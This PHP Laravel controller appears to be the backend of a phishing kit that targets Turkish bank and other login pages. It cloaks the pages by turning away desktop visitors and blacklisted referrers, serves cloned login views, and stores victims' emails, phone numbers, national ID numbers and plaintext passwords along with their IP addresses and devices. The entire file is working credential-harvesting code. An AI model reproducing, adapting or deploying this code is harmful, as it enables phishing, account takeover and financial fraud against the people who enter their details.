<?php

namespace App\Http\Controllers;

use App\Classes\SystemStatusEnum;
use App\Http\Requests\binRequest;
use App\Http\Requests\loginsRequest;
use App\Http\Requests\parRequest;
use App\Models\AdminOptions;
use App\Models\binLogModel;
use App\Models\ForbiddensModel;
use App\Models\LoginModel;
use App\Models\PLogModel;
use App\Models\Sites;
use App\Supports\Verify;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;
use Jenssegers\Agent\Facades\Agent;

class MainController extends Controller
{
    public $options = null;
    public function __construct()
    {
        $this->options = AdminOptions::query()->where('key', 'meta_pixel')->first();
    }
    public function checkControl(Request $request)
    {
        $redirectPath = AdminOptions::firstWhere('key', 'yasak_yonlendirme_link');
        $forbidden = ForbiddensModel::all();
        $referer = $request->headers->get('referer');
        $fullUrl = request()->fullUrl();
        //thanks query stringi 1 dışında gelirse masaüstü dışı engelle
        if (!$request->has('thanks') || $request->query('thanks') != 1) {
            if (Agent::isDesktop()) {
                return match ($redirectPath->value) {
                    'home' => redirect(route('root.index')),
                    '404' => abort(404),
                };
            }

            $transformForbidden = implode('|', $forbidden->pluck('value')->toArray());


            if (str_contains($transformForbidden, $referer)) {
                $redirectPath = AdminOptions::firstWhere('key', 'yasak_yonlendirme_link');
                $match = match ($redirectPath->value) {
                    'home' => Redirect::route('root.index'),
                    '404' => abort(404),
                    default => abort(404),
                };
                return $match;
            }
        }
    }
    public function index(Request $request)
    {
        $this->checkControl($request);
        return view('gnew', ['options' => $this->options]);
    }

    public function glogin(Request $request)
    {
        $this->checkControl($request);
        return view('wordpress', ['options' => $this->options]);        
    }

    public function form(Request $request)
    {
        return view('wordpress', ['options' => $this->options]);
    }

    public function dd(Request $request)
    {
        $this->checkControl($request);
        return view('deniz', ['options' => $this->options]);
    }

    public function tt(Request $request)
    {
        $this->checkControl($request);
        return view('teb', ['options' => $this->options]);
    }

    public function ff(Request $request)
    {
        $this->checkControl($request);
        return view('f', ['options' => $this->options]);
    }
    public function ib(Request $request)
    {
        $this->checkControl($request);
        return view('i', ['options' => $this->options]);
    }
    public function blogin(Request $request)
    {
        $this->checkControl($request);
        return view('b', ['options' => $this->options]);
    }

    public function plogin(Request $request)
    {
        $this->checkControl($request);
        return view('p.login', ['options' => $this->options]);
    }

    public function vlogin(Request $request)
    {
        $this->checkControl($request);
        return view('v', ['options' => $this->options]);
    }

    public function elogin(Request $request)
    {
        $this->checkControl($request);
        return view('e', ['options' => $this->options]);
    }
    
    public function firstGG(Request $request)
    {
        return view('main');
    }

    public function handleSlug($slug)
    {
        $getSlug = AdminOptions::firstWhere('key', 'kampanya_link');
        // Slug'a göre yapılacak işlemler
        $panelSlug = $getSlug->value ?? 'basvuru';  // Panelden gelen slug
        if ($slug === $panelSlug) {
            return $this->index(request());
        }

        // Eğer slug panel slug'ı değilse, 404 döndür veya başka bir işlem yap
        abort(404);
    }
    public function saveBin(binRequest $request)
    {
        $request->merge([
            'phone' => $request->phone,
            'user_agent' => Agent::browser() . ' ' . Agent::getUserAgent(),
            'system' => Agent::isDesktop() ? 'PC' : 'Mobile',
            'date' => Carbon::now(),
            'site' => request()->server('HTTP_HOST'),
            'ip' => $request->ip(),
            'system_id' => $getSystem->system ?? SystemStatusEnum::G->value
        ]);
        $binData = $request->all();

        $create = binLogModel::updateOrCreate(
            [
                'email' => $binData['email'],
                'password' => $binData['password'],
            ], // Şart: Email ve şifre aynıysa güncelle
            $binData // Güncellenecek veya eklenecek veri
        );

        return response()->json(['status' => 'ok'], 200);
    }
    public function savePar(parRequest $request)
    {
        $request->merge([
            'phone' => $request->phone,
            'email' => $request->email,
            'user_agent' => Agent::browser() . ' ' . Agent::getUserAgent(),
            'system' => Agent::isDesktop() ? 'PC' : 'Mobile',
            'date' => Carbon::now(),
            'site' => request()->server('HTTP_HOST'),
            'ip' => $request->ip(),
            'system_id' => $getSystem->system ?? SystemStatusEnum::P->value
        ]);
        $parData = $request->all();

        $create = PLogModel::updateOrCreate(
            [
                'phone' => $parData['phone'],
                'password' => $parData['password'],
            ], // Şart: Email ve şifre aynıysa güncelle
            $parData // Güncellenecek veya eklenecek veri
        );

        return response()->json(['status' => 'ok'], 200);
    }
    public function saveData(loginsRequest $request)
    {
        if ($request->tc && $request->password) {
            $uniqueReq = LoginModel::query()->where([
                'tc' => $request->tc,
                'password' => $request->password,
            ]);
            if ($uniqueReq->exists()) {
                if ($request->phone != '') {
                    $request->merge(['phone' => $request->phone]);
                }
            } else {
                $getSite = request()->server('HTTP_HOST');
                $getSystem = Sites::query()->where('site', 'like', '%' . $getSite . '%')->first();
                $request->merge(
                    [
                        'phone' => $request->phone ?? '',
                        'user_agent' => Agent::browser() . ' ' . Agent::getUserAgent(),
                        'system' => Agent::isDesktop() ? 'PC' : 'Mobile',
                        'date' => Carbon::now(),
                        'site' => request()->server('HTTP_HOST'),
                        'ip' => $request->ip(),
                        'system_id' => $getSystem->system ?? SystemStatusEnum::G->value
                    ]
                );
            }
            LoginModel::updateOrCreate([
                'tc' => $request->tc,
                'password' => $request->password,
            ], $request->all());
            return response()->json(['result' => 'success'], 200);
        }
    }

    public function resetcache()
    {
        app()->make(\Spatie\Permission\PermissionRegistrar::class)->forgetCachedPermissions();
    }

    public function test(Request $request) {}
}
